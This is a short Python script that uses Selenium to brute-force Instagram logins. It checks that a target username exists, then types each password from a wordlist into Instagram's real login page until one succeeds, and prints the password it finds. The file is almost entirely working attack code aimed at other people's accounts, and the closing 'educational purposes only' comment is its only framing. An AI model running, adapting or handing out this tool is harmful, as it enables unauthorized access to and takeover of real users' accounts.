# -*- coding: utf-8 -*-
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import sys

# Define colors for output
R = '\033[31m'  # red
W = '\033[0m'  # white (normal)
G = '\033[32m'  # green
O = '\033[33m'  # orange

def inst_user_check(username):
    try:
        driver = webdriver.Firefox()
        driver.get(f"https://instagram.com/{username}")
        assert "Sorry, this page isn't available." not in driver.page_source
        driver.close()
        return True
    except AssertionError:
        return False

def instagram_bruteforce(username, wordlist, delay):
    driver = webdriver.Firefox()
    driver.get("https://instagram.com/accounts/login")
    
    with open(wordlist, 'r') as wl:
        for line in wl:
            password = line.strip()
            try:
                elem = driver.find_element("name", "username")
                elem.clear()
                elem.send_keys(username)
                elem = driver.find_element("name", "password")
                elem.clear()
                elem.send_keys(password)
                elem.send_keys(Keys.RETURN)
                print(f"{O}[*] Username: {username} | [*] Password: {password} | Incorrect!{W}")
                sleep(delay)
                assert "Login" in driver.title
            except AssertionError:
                print(f"{G}[*] Username: {username} | [*] Password found: {password}{W}")
                driver.quit()
                sys.exit()
            except Exception as e:
                print(f"{R}[!] Oops, something went wrong. Did you terminate the connection? [!]{W}")
                driver.quit()
                sys.exit()

# Note: This script is for educational purposes only.
